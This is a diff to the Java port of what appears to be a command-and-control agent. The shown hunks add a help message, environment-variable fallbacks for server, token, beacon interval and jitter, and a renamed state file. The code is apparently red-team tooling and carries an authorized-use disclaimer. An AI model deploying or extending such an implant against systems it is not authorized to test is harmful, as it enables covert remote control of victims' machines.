@@ -33,17 +33,30 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 /**
- * C2 agent - Java reference port.
+ * Java agent — C2 agent, Java port.
  *
- * Mirrors the canonical Python client (clients/agent.py) using only the JDK
- * standard library (no third-party JSON/HTTP deps). Wire protocol documented
- * in C2/protocol.md.
+ * Port of clients/agent.py with identical CLI flags, task types and result
+ * shapes. Wire protocol documented in C2/protocol.md. Mirrors the canonical
+ * Python client using only the JDK standard library (no third-party
+ * JSON/HTTP deps).
  *
+ * Build:  javac -encoding UTF-8 agent.java
  * Usage:
- *     javac -encoding UTF-8 agent.java
  *     java Agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
  *     java Agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
  *                  --interval 5 --jitter 2 --verbose
+ *
+ * Environment variables (accepted when the flag is not given):
+ *     C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+ *
+ * Flags:
+ *     --server URL      server base URL (required unless C2_SERVER is set)
+ *     --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+ *     --interval N      heartbeat interval in seconds (default 10, min 1)
+ *     --jitter N        random jitter in seconds added to the interval
+ *     --state FILE      state file persisting the agent id (default ~/.c2agent_java.json)
+ *     --verbose         print activity to stdout
+ *     -h, --help        show this help and exit
  *
  * Only use against systems you own or are authorized to test.
  */
@@ -1714,23 +1727,62 @@ class Agent {
             + " [--interval N] [--jitter N] [--state FILE] [--verbose]");
     }
 
+    static void printHelp() {
+        System.out.println("usage: java Agent --server URL --token TOKEN"
+            + " [--interval N] [--jitter N] [--state FILE] [--verbose]");
+        System.out.println();
+        System.out.println("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):");
+        System.out.println("  --server URL      server base URL (required unless C2_SERVER is set)");
+        System.out.println("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)");
+        System.out.println("  --interval N      heartbeat interval in seconds (default 10, min 1)");
+        System.out.println("  --jitter N        random jitter in seconds added to the interval");
+        System.out.println("  --state FILE      state file persisting the agent id (default ~/.c2agent_java.json)");
+        System.out.println("  --verbose         print activity to stdout");
+        System.out.println("  -h, --help        show this help and exit");
+    }
+
     public static void main(String[] args) {
         String serverArg = System.getenv("C2_SERVER");
         String tokenArg = System.getenv("C2_TOKEN");
         long intervalArg = 10;
         long jitterArg = 0;
-        String stateArg = homeFile(".Agent_java.json");
+        String stateArg = homeFile(".c2agent_java.json");
         boolean verboseArg = false;
+        boolean intervalGiven = false;
+        boolean jitterGiven = false;
+        boolean stateGiven = false;
 
         for (int i = 0; i < args.length; i++) {
             String a = args[i];
-            if (a.equals("--server") && i + 1 < args.length) serverArg = args[++i];
+            if (a.equals("-h") || a.equals("--help")) {
+                printHelp();
+                System.exit(0);
+            } else if (a.equals("--server") && i + 1 < args.length) serverArg = args[++i];
             else if (a.equals("--token") && i + 1 < args.length) tokenArg = args[++i];
-            else if (a.equals("--interval") && i + 1 < args.length) intervalArg = Integer.parseInt(args[++i]);
-            else if (a.equals("--jitter") && i + 1 < args.length) jitterArg = Integer.parseInt(args[++i]);
-            else if (a.equals("--state") && i + 1 < args.length) stateArg = args[++i];
+            else if (a.equals("--interval") && i + 1 < args.length) { intervalArg = Integer.parseInt(args[++i]); intervalGiven = true; }
+            else if (a.equals("--jitter") && i + 1 < args.length) { jitterArg = Integer.parseInt(args[++i]); jitterGiven = true; }
+            else if (a.equals("--state") && i + 1 < args.length) { stateArg = args[++i]; stateGiven = true; }
             else if (a.equals("--verbose")) verboseArg = true;
         }
+
+        if (!intervalGiven) {
+            String iv = System.getenv("C2_INTERVAL");
+            if (iv != null && !iv.isEmpty()) {
+                try { intervalArg = Math.max(1, Long.parseLong(iv)); } catch (NumberFormatException e) {}
+            }
+        }
+        if (!jitterGiven) {
+            String jt = System.getenv("C2_JITTER");
+            if (jt != null && !jt.isEmpty()) {
+                try { jitterArg = Math.max(0, Long.parseLong(jt)); } catch (NumberFormatException e) {}
+            }
+        }
+        if (!stateGiven) {
+            String sf = System.getenv("C2_STATE_FILE");
+            if (sf != null && !sf.isEmpty()) stateArg = sf;
+        }
+        String vb = System.getenv("C2_VERBOSE");
+        if (!verboseArg && vb != null && (vb.equals("1") || vb.equals("true"))) verboseArg = true;
 
         if (tokenArg == null || tokenArg.isEmpty()) {
             System.err.println("--token is required (or set C2_TOKEN)");
